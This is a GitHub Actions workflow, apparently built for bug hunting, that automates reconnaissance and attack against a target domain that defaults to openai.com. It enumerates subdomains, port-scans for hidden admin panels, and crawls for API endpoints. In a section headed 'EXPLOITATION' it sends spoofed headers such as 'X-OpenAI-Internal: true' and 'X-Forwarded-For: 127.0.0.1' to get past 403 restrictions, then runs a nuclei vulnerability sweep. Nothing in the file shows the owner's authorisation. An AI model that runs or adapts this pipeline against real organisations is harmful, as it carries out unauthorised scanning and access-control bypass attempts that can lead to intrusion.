name: OpenAI-Max-Coverage-Security-Engine

on:
  workflow_dispatch:
    inputs:
      target_domain:
        description: 'Domain to hunt (e.g., openai.com)'
        required: true
        default: 'openai.com'

jobs:
  security-intel:
    runs-on: ubuntu-latest
    timeout-minutes: 180 # Increased for deep crawling

    steps:
    - name: Checkout
      uses: actions/checkout@v4

    - name: Install Full Arsenal
      run: |
        sudo apt update && sudo apt install -y jq parallel nmap dnsutils
        # ProjectDiscovery Suite
        go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
        go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
        go install -v github.com/projectdiscovery/katana/cmd/katana@latest
        go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
        go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
        # Fuzzing tools
        go install -v github.com/ffuf/ffuf/v2@latest
        pip install arjun
        sudo mv ~/go/bin/* /usr/local/bin/

    # ---------------- RECON ----------------

    - name: Asset Discovery (Subdomains & Port Scan)
      run: |
        echo "${{ github.event.inputs.target_domain }}" > scope.txt
        # Find all subdomains
        subfinder -dL scope.txt -all -silent -o subs.txt
        # Port scan the findings to find hidden dev/admin panels
        naabu -l subs.txt -top-ports 100 -silent -o ports.txt
        # Check for live web services
        httpx -l ports.txt -sc -cl -title -td -silent -o live.txt

    - name: Surface Mapping (Katana Crawling)
      run: |
        # Crawl for hidden API endpoints and JS files
        katana -l live.txt -jc -kf -d 3 -silent -o endpoints.txt

    # ---------------- EXPLOITATION ----------------

    - name: Deep 403/404 Bypass Sweep
      run: |
        # Targeting the endpoints Katana found with our bypass headers
        # We look for anomalies in Content-Length
        httpx -l endpoints.txt -path "//" \
          -H "X-OpenAI-Internal: true" \
          -H "X-Forwarded-For: 127.0.0.1" \
          -sc -cl -title -o bypass_findings.txt

    - name: Full Vulnerability Sweep (Nuclei)
      run: |
        # Scanning for known CVEs, BOLA, and SSRF
        nuclei -l live.txt -severity critical,high,medium -o nuclei_findings.txt

    # ---------------- REPORTING ----------------

    - name: Build Bug Report
      run: |
        mkdir -p results
        cp *.txt results/ || true
        # Create a summary of potential high-value hits
        grep "200" results/bypass_findings.txt > results/POSSIBLE_BUGS.md || echo "No direct bypass yet" > results/POSSIBLE_BUGS.md
        tar -czf security-results.tar.gz results

    - name: Upload Evidence
      uses: actions/upload-artifact@v4
      with:
        name: full-recon-pack
        path: security-results.tar.gz
        
